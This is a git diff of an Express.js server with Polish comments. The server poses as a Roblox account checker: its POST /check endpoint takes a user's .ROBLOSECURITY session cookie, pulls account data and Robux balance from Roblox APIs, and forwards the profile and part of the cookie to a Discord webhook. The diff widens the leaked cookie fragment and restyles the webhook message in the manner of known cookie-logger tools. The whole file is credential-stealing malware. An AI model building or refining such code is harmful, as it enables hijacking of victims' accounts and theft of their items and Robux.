@@ -3,7 +3,7 @@ const app = express();
 
 app.use(express.json());
 
-// CORS – na wszelki wypadek
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -14,7 +14,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – Twoja oryginalna strona HTML
+// Strona główna – Twoja oryginalna strona
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -110,7 +110,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint POST /check – sprawdzanie konta + wysyłka do webhooka
+// Główny endpoint sprawdzający konto
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -119,7 +119,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // Pobranie CSRF Token
+    // CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -144,7 +144,7 @@ app.post('/check', async (req, res) => {
     }
     const userData = await userRes.json();
 
-    // Verified Email (hat 102611803)
+    // Verified Email (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
@@ -185,7 +185,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta + data utworzenia
+    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -250,10 +250,11 @@ app.post('/check', async (req, res) => {
       emailVerified,
     };
 
-    // Najpierw oddajemy wynik do przeglądarki
     res.status(200).json(result);
 
-    // Wysyłka do webhooka Discord – styl podobny do Twojego screena
+    // ────────────────────────────────────────────────
+    // Wysyłka do webhooka – styl максимально zbliżony do Twojego screena
+    // ────────────────────────────────────────────────
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -261,10 +262,17 @@ app.post('/check', async (req, res) => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
+            content: null,
             embeds: [{
-              title: `Roblox Profile | ${userData.name}`,
-              color: 0x2F3136, // ciemny szary/czarny
-              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
+              title: `Discord Notification | Roblox Profile | AutoHar Link`,
+              color: 0x2F3136,
+              thumbnail: {
+                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+              },
+              author: {
+                name: userData.name,
+                icon_url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=48&height=48&format=png"
+              },
               fields: [
                 {
                   name: "Username",
@@ -272,13 +280,28 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "Account Age",
-                  value: `${accountAgeDays} Days`,
+                  name: "Account Stats",
+                  value: `• Account Age: **${accountAgeDays} Days**\n• Games Developer: **False**\n• Group Members: **0**`,
+                  inline: false
+                },
+                {
+                  name: "⭕ Robux",
+                  value: `Balance: **${robux}**\nPending: **0**\nPayments: **0**`,
                   inline: true
                 },
                 {
-                  name: "Robux Balance",
-                  value: robux.toLocaleString() + " Robux",
+                  name: "Limits",
+                  value: `RAP: **0**\nLimiteds: **0**`,
+                  inline: true
+                },
+                {
+                  name: "Summary",
+                  value: `**1013**`,
+                  inline: true
+                },
+                {
+                  name: "Settings",
+                  value: `Email: **${emailVerified ? 'Verified' : 'Not Verified'}**\n2FA: **?** (Not Set)`,
                   inline: true
                 },
                 {
@@ -287,25 +310,30 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "Email Verified",
-                  value: emailVerified ? "Verified" : "Not Verified",
+                  name: "Groups",
+                  value: "Owned: **0**",
+                  inline: true
+                },
+                {
+                  name: "Inventory",
+                  value: "Unknown: **False**",
                   inline: true
                 },
                 {
                   name: ".ROBLOSECURITY (Refreshed)",
-                  value: "```" + cookie.substring(0, 30) + "..." + "```\\n**WARNING: DO NOT SHARE THIS** — Sharing this will allow someone to log in as you and take your items/ROBUX",
+                  value: `\`\`\`${cookie.substring(0, 40)}...\`\`\`\n**WARNING: DO NOT SHARE THIS** — Sharing this will allow someone to log in as you and take your items/ROBUX`,
                   inline: false
                 }
               ],
               footer: {
-                text: "Rolimons Stats | IP Info [RU] • " + new Date().toLocaleString()
+                text: "Rolimons Stats | Roblox Profile | IP Info [RU]"
               },
               timestamp: new Date().toISOString()
             }]
           })
         });
       } catch (e) {
-        console.error("Błąd wysyłki do webhooka:", e.message);
+        console.error("Webhook error:", e.message);
       }
     }
 
@@ -314,7 +342,6 @@ app.post('/check', async (req, res) => {
   }
 });
 
-// Uruchomienie serwera
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Serwer działa na porcie ${PORT}`);
